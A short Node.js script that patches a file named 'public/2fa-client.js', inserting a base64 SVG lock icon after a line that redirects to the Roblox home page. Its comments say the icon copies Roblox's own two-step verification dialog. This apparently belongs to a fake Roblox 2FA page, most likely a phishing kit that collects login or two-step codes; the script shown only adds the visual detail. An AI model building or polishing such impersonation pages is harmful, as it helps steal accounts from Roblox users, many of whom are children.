const fs = require('fs');
const path = require('path');

const target = path.join(__dirname, '..', 'public', '2fa-client.js');
const b64 = fs.readFileSync(path.join(__dirname, 'rbx-lock.b64.txt'), 'utf8').trim();

let src = fs.readFileSync(target, 'utf8');

const anchor = "    var LANDING = 'https://www.roblox.com/home';";
if (!src.includes(anchor)) {
    console.error('anchor not found');
    process.exit(1);
}

const insert = [
    anchor,
    '',
    "    // Roblox's own two-step dialog leads with a shield-and-lock plate.",
    '    // Silhouette follows Challenge.css .modal-lock-icon, not an eyeball.',
    "    var LOCK_SVG = 'data:image/svg+xml;base64," + b64 + "';"
].join('\n');

src = src.replace(anchor, insert);
fs.writeFileSync(target, src);
console.log('patched, b64 len', b64.length);
